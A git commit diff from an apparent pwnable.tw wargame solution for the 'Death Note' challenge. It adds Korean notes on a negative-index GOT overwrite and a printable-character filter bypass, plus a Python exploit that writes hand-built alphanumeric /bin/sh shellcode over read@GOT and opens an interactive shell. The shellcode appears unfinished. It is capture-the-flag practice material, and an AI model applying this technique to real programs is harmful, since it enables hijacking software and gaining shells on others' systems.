07cf85dacade1cf968797c26554c08cb2f6a0ad6
starbuucks <hee980410@gmail.com>
2020-07-23 10:12:18 +0900

    Make exploit

--- Death Note/README.md
+++ Death Note/README.md
@@ -4,8 +4,33 @@
 
 ## Code analysis
 
-가장 큰 문제 : minus indexing이 가능함 -> got overwrite 가능(add) / libc leak도 가능(show)
+가장 큰 문제 : minus indexing이 가능함 -> got overwrite 가능(add)
 
 read_input 함수는 null로 끝나지 않을 수 있음
 
 is_printable은 중간에 null 넣으면 우회가능
+
+```shell
+gdb-peda$ vmmap
+Start      End        Perm	Name
+0x08048000 0x08049000 r-xp	/home/starbuucks/pwnable_tw/Death Note/death_note
+0x08049000 0x0804a000 r-xp	/home/starbuucks/pwnable_tw/Death Note/death_note
+0x0804a000 0x0804b000 rwxp	/home/starbuucks/pwnable_tw/Death Note/death_note
+0xf7d73000 0xf7d74000 rwxp	mapped
+0xf7d74000 0xf7f21000 r-xp	/lib32/libc-2.23.so
+0xf7f21000 0xf7f22000 ---p	/lib32/libc-2.23.so
+0xf7f22000 0xf7f24000 r-xp	/lib32/libc-2.23.so
+0xf7f24000 0xf7f25000 rwxp	/lib32/libc-2.23.so
+0xf7f25000 0xf7f28000 rwxp	mapped
+0xf7f40000 0xf7f41000 rwxp	mapped
+0xf7f41000 0xf7f44000 r--p	[vvar]
+0xf7f44000 0xf7f46000 r-xp	[vdso]
+0xf7f46000 0xf7f69000 r-xp	/lib32/ld-2.23.so
+0xf7f69000 0xf7f6a000 r-xp	/lib32/ld-2.23.so
+0xf7f6a000 0xf7f6b000 rwxp	/lib32/ld-2.23.so
+0xffeb3000 0xffed4000 rwxp	[stack]
+```
+
+rwx 권한 있는 영역도 많다.
+
+이거 그냥 shellcode를 got로 올려서 실행하면 안되나?
--- Death Note/sol_deathNote.py
+++ Death Note/sol_deathNote.py
@@ -42,9 +42,45 @@ def exit():
 		print 'exit finished'
 
 def exploit():
-	pass
+	note = 0x0804A060
+	read_got = 0x0804A00C
 
-def main():
+	shellcode = '\x25\x40\x40\x40\x40'		# and    eax,0x40404040
+	shellcode += '\x25\x20\x20\x20\x20'		# and    eax,0x20202020
+	shellcode += '\x50'						# push   eax
+	shellcode += '\x68\x2f\x2f\x73\x68'		# push   0x68732f2f
+	shellcode += '\x68\x2f\x62\x69\x6e'		# push   0x6e69622f
+	shellcode += '\x54'						# push   esp
+	shellcode += '\x5b'						# pop    ebx
+	shellcode += '\x25\x40\x40\x40\x40'		# and    eax,0x40404040
+	shellcode += '\x25\x20\x20\x20\x20'		# and    eax,0x20202020
+	shellcode += '\x50'						# push   eax
+	shellcode += '\x50'						# push   eax
+	shellcode += '\x59'						# pop    ecx
+	shellcode += '\x5a'						# pop    edx
+
+	shellcode += '\x68\x33\x33\x20\x20'		# push   0x20203333
+	shellcode += '\x58'						# pop    eax
+	shellcode += '\x66\x2d\x20\x4f'			# sub    ax,0x4f20
+	shellcode += '\x66\x2d\x33\x50'			# sub    ax,0x5033	(eax = 0x333380cd)
+	shellcode += '\x50'						# push   eax
+	shellcode += '\x54'						# push   esp
+
+	shellcode += '\x25\x40\x40\x40\x40'		# and    eax,0x40404040
+	shellcode += '\x25\x20\x20\x20\x20'		# and    eax,0x20202020
+	shellcode += '\x40' * 0xb				# inc    eax (* 0xb)
+	shellcode += '\x50'						# push   eax
+	shellcode += '\x58'						# pop    eax
+	shellcode += ''
+	shellcode += '\x00'
+
+	print len(shellcode)
+
+	idx = (read_got - note) / 4
+	
+	add(idx, shellcode)
+
+if __name__ == '__main__':
 	if debug:
 		s = process('./death_note')
 		pause()
@@ -54,6 +90,3 @@ def main():
 	exploit()
 	s.interactive()
 	s.close()
-
-if __name__ == '__main__':
-	main()
